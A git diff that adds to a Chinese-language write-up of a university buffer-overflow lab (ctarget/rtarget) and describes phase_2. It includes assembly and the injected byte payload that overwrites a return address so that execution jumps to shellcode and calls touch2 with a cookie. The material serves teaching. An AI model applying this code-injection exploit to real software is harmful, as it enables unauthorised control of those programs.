@@ -27,6 +27,8 @@ x86-64 的函数返回过程：
 
 因为没有课程网站的账号，所以只能通过`./ctarget -q`和`/rtarget -q`来进行实验
 
+这个lab不需要查看x86汇编来进行逆向，pdf中已经给出了函数的C表示
+
 ## phase_1
 
 ctarget的正常流程是执行`test`
@@ -81,3 +83,49 @@ c0 17 40 00
 ```
 
 然后再使用`./hex2raw`转换为ctarget能够读取的2进制文件即可
+
+## phase_2
+
+`Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,
+however, you must make it appear to touch2 as if you have passed your cookie as its argument.`
+
+touch2的C表示如下
+
+```c
+void touch2(unsigned val) {
+    vlevel = 2; 		/* Part of validationg protocol */
+    if  (val == cookie) {
+        printf("Touch2!: You called touch2(0x%.8x)\n", val);
+        validate(2);
+    } else {
+        printf("Misfire: You called touch2(0x%.8x)\n", val);
+        fail(2);
+    }
+    exit(0);
+}
+```
+
+需要将cookie作为参数传入，然后将touch2函数的起始地址压入栈中，最后返回
+
+```assembly
+mov $0x59b997fa, %rdi
+pushq $0x4017ec # 最开始不小心写成了pushq 0x4017ec，这样就变成了内存寻址，直接
+ret
+```
+
+将这段汇编通过汇编器转换为对应的机器码(`gcc -c phase_2.s`, `objdump -d phase_2.o`)，将机器码通过get_buf输入到缓冲区中，再在get_buf还未结束时通过phase_1中使用过的方法溢出将返回地址修改为缓冲区的地址（即此时的$rsp），跳转到缓冲区来执行注入的机器码，执行完注入的机器码后将带着设定好的参数跳转到touch2完成phase_2
+
+```
+48 c7 c7 fa 
+97 b9 59 68
+ec 17 40 00 
+c3 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00
+78 dc 61 55
+```
+
